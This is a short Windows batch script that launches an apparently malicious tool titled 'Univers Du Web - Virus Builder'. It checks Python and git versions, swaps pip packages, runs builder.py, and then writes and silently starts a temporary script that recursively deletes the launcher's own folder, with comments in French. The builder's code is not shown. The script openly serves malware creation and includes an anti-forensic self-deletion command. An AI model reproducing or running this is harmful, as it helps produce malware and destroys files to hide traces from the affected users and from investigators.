@echo off
mode con: cols=100 lines=30
title Univers Du Web - Virus Builder
color 0a
cls

python --version 2>&1 | findstr " 3.11" >nul
if %errorlevel% == 0 (
    echo python 3.11.x and up are not supported by UDW. Please downgrade to python 3.10.x.
    pause
    exit
)

::fixed by K.Dot cause dif
git --version 2>&1>nul
if %errorlevel% == 9009 (
    echo git is either not installed or not added to path! You can install it here https://git-scm.com/download/win
    pause
    exit
)

py -3.10 -m pip uninstall -r interferences.txt
py -3.10 -m pip install --upgrade -r requirements.txt

cls

if exist build rmdir /s /q build
py -3.10 builder.py

:: Auto-suppression : crée un autre batch temporaire qui va supprimer le dossier
echo @echo off > "%temp%\_cleanup.bat"
echo timeout /t 2 > "%temp%\_cleanup.bat"
echo rmdir /s /q "%~dp0" >> "%temp%\_cleanup.bat"

:: Lance le batch de suppression et quitte
start "" /min "%temp%\_cleanup.bat"
pause >nul
